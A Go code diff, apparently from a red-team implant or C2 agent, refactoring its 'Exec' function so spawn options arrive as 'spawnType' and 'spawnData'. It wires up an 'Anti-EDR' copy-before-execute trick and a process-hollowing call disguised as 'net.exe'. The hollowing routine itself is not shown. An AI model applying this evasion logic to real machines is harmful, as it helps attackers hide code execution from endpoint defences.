@@ -103,6 +103,15 @@ func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pi
 		return stdOut, stdErr, pid, exitCode, fmt.Errorf("no argument 'shelltype' given")
 	}
 
+	spawnType, ok := packetArgument["spawnType"]
+	if !ok {
+		spawnType = "standard"
+	}
+	spawnData, ok := packetArgument["spawnData"]
+	if !ok {
+		spawnData = ""
+	}
+
 	// Extract effective executable path and arguments
 	var executable string
 	var args []string
@@ -136,14 +145,17 @@ func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pi
 	}
 
 	/* Anti-EDR: copyFirst */
-	copyFirst, ok := packetArgument["copyFirst"]
-	if ok {
-		err = CopyFile(executable, copyFirst)
+	if spawnType == "copyFirst" {
+		if spawnData == "" {
+			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Spawn copyfirst, but no path in spawnData found")
+		}
+
+		err = CopyFile(executable, spawnData)
 		if err != nil {
 			return stdOut, stdErr, pid, exitCode, fmt.Errorf("error copying file: %s", err.Error())
 		}
 		// Destination is the new binary we execute
-		executable = copyFirst
+		executable = spawnData
 	}
 
 	cmd := exec.CommandContext(ctx, executable, args...)
@@ -170,11 +182,14 @@ func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pi
 	// Inject?
 
 	// See how we want to execute it
-	source, ok := packetArgument["hollow"]
-	if ok {
+	if spawnType == "hollow" {
+		if spawnData == "" {
+			return stdOut, stdErr, pid, exitCode, fmt.Errorf("Spawn hollow, but no path in spawnData found")
+		}
+
 		// Perform Process Hollowing
 		name := "net.exe" // TODO
-		pid, stdOut, stdErr, err = hollow(source, executable, name, args)
+		pid, stdOut, stdErr, err = hollow(spawnData, executable, name, args)
 		if err != nil {
 			log.Errorf("Error: %s", err.Error())
 		}
